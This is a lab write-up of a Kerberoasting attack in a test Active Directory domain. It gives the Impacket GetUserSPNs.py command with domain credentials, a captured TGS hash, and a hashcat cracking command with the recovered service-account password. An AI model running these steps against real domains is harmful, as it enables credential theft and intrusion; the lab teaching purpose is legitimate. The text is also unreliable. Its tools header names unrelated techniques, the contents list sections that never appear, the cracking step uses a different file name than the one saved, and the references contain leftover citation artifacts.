# kerberosting attack

**Date:** June 2026  
**Author:** ShahinSecLab  
**Category:** Active Directory  
**Difficulty:** Medium 
**Tools:** Meterpreter, Incognito, Windows Access Tokens

# Table of content

- [What is Kerberoasting?](#what-is-kerberoasting)
- [Objective](#Objective)
- [How Kerberoasting Works](#how-kerberoasting-works)
- [Lab Setup](#lab-setup)
- [Attack Process](#attack-process)
  - [Step 1 – Find Service Accounts](#step-1--find-service-accounts)
  - [Step 2 – Save Hash to File](#step-2--save-hash-to-file)
  - [Step 3 – Crack the Ticket](#step-3--crack-the-ticket)
- [Why Kerberoasting is Dangerous](#why-kerberoasting-is-dangerous)
- [Detection](#detection)
- [Mitigation](#mitigation)
- [Impact](#impact)
- [Key Takeaways](#key-takeaways)
- [References](#references)

## What is Kerberoasting?

In Windows networks, services (like SQL Server, IIS, etc.) are registered with something called an SPN (Service Principal Name). When a user wants to access a service, Windows gives them an encrypted service ticket. That ticket is encrypted using the service account's password hash.
Here is the problem — any logged-in domain user can request that ticket, no special permissions needed. An attacker can grab that ticket, take it offline, and crack it to recover the real password.

## Objective

- Identify service accounts with SPNs
- Request Kerberos service tickets
- Extract and analyze ticket data
- Attempt offline password cracking
- Evaluate security posture of service account password policy


## How Kerberoasting Works

```
Domain User
     |
     | Requests TGS Ticket
     v
Domain Controller
     |
     | Returns Ticket
     | Encrypted with Service Account Password
     v
Attacker Extracts Ticket
     |
     | Offline Password Cracking
     v
Service Account Password Recovered
```

## Lab Setup

```
| Machine             | Role              |   Ip          |
|---------------------|-------------------|---------------|
| Windows Server 2022 | Domain Controller | 192.168.5.134 |
| Windows 10          | Domain User       | 192.168.5.142 |
| Kali Linux          | Attacker          | 192.168.5.128 |
```


I already have..
- Domain: readteambd.local
- User: rahimkhan
- Pass: Password1

## Attack Process

## Step 1 – Find Service Accounts

```bash
GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request
```

```
| Part                  |                     Description                      |
|-----------------------|------------------------------------------------------|
| `GetUserSPNs.py`      | Impacket tool used for Kerberoasting.                |
|                       | Finds service accounts with SPNs in Active Directory |
|                       | and requests Kerberos service tickets (TGS)          |
| `readteambd.local`    | Active Directory domain name                         |
| `rahimkhan:Password1` | Domain username and password used to authenticate    |
| `-dc-ip 192.168.5.134`| IP address of the Domain Controller                  |
| `-request`            | Tells the tool to actually pull the TGS tickets in   |
|                       | crackable hash format                                |
```

**Output:**

```
GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName                            Name        MemberOf                                                         PasswordLastSet      LastLogon 
----------------------------------------------  ----------  ---------------------------------------------------------------  -------------------  ---------
ReadTeamBD-DC/SQLService.READTEAMBD.local:6011  sqlservice  CN=Group Policy Creator Owners,OU=Groups,DC=READTEAMBD,DC=local  2025-10-31 06:16:29  <never>   

$krb5tgs$23$*sqlservice$READTEAMBD.LOCAL$ReadTeamBD-DC/SQLService.READTEAMBD.local~6011*$96f871a359f348008f60f60c2ec9c111$0661ac2eeb77cd03dbf48722c056055adcfbab......
```

```
Service Account: sqlservice
SPN: SQLService.READTEAMBD.local
Domain: READTEAMBD.local
```

## Step 2 – Save Hash to File

- save hash to `kerberoast.txt` file

```bash
GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request -outputfile kerberoast.txt
```

## Step 3 – Crack the Ticket

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
| Flag             |                 Description                     |
|------------------|-------------------------------------------------|
| `-m 13100`       | Hash mode — Kerberos 5 TGS-REP (etype 23 / RC4) |
| `kerberoast.txt` | The file containing the extracted hash          |
| `rockyou.txt`    | The wordlist used to crack the password         |
```

**Output:**

```
Status: Cracked
Hash Mode: 13100 (Kerberos 5, etype 23, TGS-REP)
Target Account: sqlservice
Recovered Password: Mypassword123#
```

<p align="center">
  <img src="/writeups/kerbersoting attack/images/step3.png" width="600">
</p>

## Key Takeaways

- Any domain user can perform Kerberoasting
- Attack targets service accounts with SPNs
- Tickets are cracked offline
- Weak service account passwords are the main risk
- Monitoring Event ID 4769 helps detect suspicious activity

## References

- :contentReference[oaicite:0]{index=0}  
  Kerberoasting technique reference and attack mapping:  
  https://attack.mitre.org/techniques/T1558/003/

- :contentReference[oaicite:1]{index=1} Kerberos Documentation  
  Official Microsoft Kerberos authentication overview and documentation:  
  https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview

- MITRE ATT&CK – Credential Access: Kerberoasting (T1558.003)  
  https://attack.mitre.org/techniques/T1558/003/